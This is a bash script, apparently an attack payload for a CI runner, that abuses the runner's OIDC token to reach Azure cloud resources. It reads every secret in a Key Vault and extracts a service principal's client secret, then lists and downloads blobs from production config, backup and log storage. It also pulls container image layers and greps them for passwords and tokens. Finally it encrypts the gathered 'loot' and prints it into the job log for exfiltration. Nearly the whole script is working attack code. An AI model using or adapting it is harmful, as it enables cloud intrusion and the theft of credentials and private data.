#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"
AAD="${SC}login.microsoftonline.com"; STG="storage.azure.com"; ACRH="crtblplatprodx3euoz.azurecr.io"; KVH="vault.azure.net"
TENANT=$AZURE_TENANT_ID
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
echo "=== RUNNER SHELL PROOF ==="; id; hostname
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
sptok(){ curl -sS -X POST "${AAD}/${TENANT}/oauth2/v2.0/token" -d "client_id=$1" -d "grant_type=client_credentials" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
VT=$(curl -sS -X POST "${AAD}/${TENANT}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=${SC}${KVH}/.default" | jq -r '.access_token // empty')
L=$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.${KVH}/secrets?api-version=7.4")
C=""
for id in $(printf '%s' "$L" | jq -r '.value[]?.id // empty'); do
  V=$(curl -sS -H "Authorization: Bearer $VT" "$id?api-version=7.4" | jq -r '.value // empty')
  A=$(printf '%s' "$V" | jq -r '.appId // empty'); S=$(printf '%s' "$V" | jq -r '.clientSecret // empty')
  [ "$A" = "038bc35d-131d-4953-9985-ff4a245ccec1" ] && C="$A:$S"
done
ST=$(sptok "${C%%:*}" "${C#*:}" "${SC}${STG}/.default")
for ACC_CON in sttblappcfgprodx3euoz/config sttblbackupprodx3euoz/exports sttblcilogsprodx3euoz/logs; do
 ACC=${ACC_CON%%/*}; CON=${ACC_CON#*/}
 say "RAW $ACC/$CON: $(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "${SC}$ACC.blob.core.windows.net/$CON?restype=container&comp=list" | head -c 2500)"
done
for ACC_CON in sttblappcfgprodx3euoz/config sttblbackupprodx3euoz/exports; do
 ACC=${ACC_CON%%/*}; CON=${ACC_CON#*/}
 R=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "${SC}$ACC.blob.core.windows.net/$CON?restype=container&comp=list")
 for B in $(printf '%s' "$R" | tr '<' '\n' | sed -n 's/^Name>//p'); do
   say "BLOB $CON/$B: $(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "${SC}$ACC.blob.core.windows.net/$CON/$B" | head -c 4000)"
 done
done
say "=== ACR FULL ==="
for REPO in tebamoto-reporting-api catalog-api; do
  TK=$(curl -sS -G "${SC}${ACRH}/oauth2/token" --data-urlencode "service=${ACRH}" --data-urlencode "scope=repository:${REPO}:pull" | jq -r '.access_token // empty')
  IDX=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.manifest.v1+json' "${SC}${ACRH}/v2/$REPO/manifests/latest")
  say "IDX $REPO: $(printf '%s' "$IDX" | head -c 900)"
  CH=$(printf '%s' "$IDX" | jq -r '[.. | objects | select(.platform?.architecture=="amd64") | .digest] | first // empty' 2>/dev/null)
  [ -z "$CH" ] && CH=$(printf '%s' "$IDX" | jq -r '.manifests[0].digest // empty' 2>/dev/null)
  say "CH=$CH"
  M=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json' "${SC}${ACRH}/v2/$REPO/manifests/$CH")
  say "CFG=$(printf '%s' "$M" | jq -r '.config.digest // empty')"
  for D in $(printf '%s' "$M" | jq -r '.layers[]?.digest // empty'); do
    SZ=$(curl -sS -L -H "Authorization: Bearer $TK" "${SC}${ACRH}/v2/$REPO/blobs/$D" -o /tmp/l10.tgz -w '%{size_download}')
    say "LAYER $D sz=$SZ files=$(tar -tzf /tmp/l10.tgz 2>/dev/null | tr '\n' ' ' | head -c 500)"
    say "TXT: $(tar -xzf /tmp/l10.tgz -O 2>/dev/null | strings | grep -a -iE 'flag|secret|password|token|key' | head -15 | tr '\n' '|' | head -c 1200)"
  done
  CFGD=$(printf '%s' "$M" | jq -r '.config.digest // empty')
  [ -n "$CFGD" ] && say "CFGBLOB: $(curl -sS -L -H "Authorization: Bearer $TK" "${SC}${ACRH}/v2/$REPO/blobs/$CFGD" | head -c 1500)"
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
